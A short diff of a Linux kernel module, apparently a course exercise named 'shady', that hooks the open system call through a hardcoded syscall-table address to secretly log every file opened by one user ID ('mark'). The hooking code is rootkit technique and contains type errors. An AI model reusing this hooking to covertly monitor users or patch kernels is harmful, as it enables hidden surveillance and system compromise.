@@ -54,7 +54,7 @@ static struct class *shady_class = NULL;
 /* ================================================================ */
 // MY CODE
 unsigned long system_call_table_address = 0xffffffff81801400;
-int marks_uid = 1001;
+unsigned int marks_uid = 1001;
 
 void set_addr_rw (unsigned long addr) {
     unsigned int level;
@@ -66,9 +66,9 @@ asmlinkage int (*old_open) (const char*, int, int);
 
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
-    printk(KERN_DEBUG "UID: %s\n", current->uid);
+    printk(KERN_DEBUG "UID: %s\n", get_uid());
     // check to see if mark is the one opeing the file
-    if (current->uid == marks_uid) {
+    if (get_uid() == marks_uid) {
         printk(KERN_DEBUG "OPENED: %s\n", file);
     }
     return old_open(file, flags, mode);
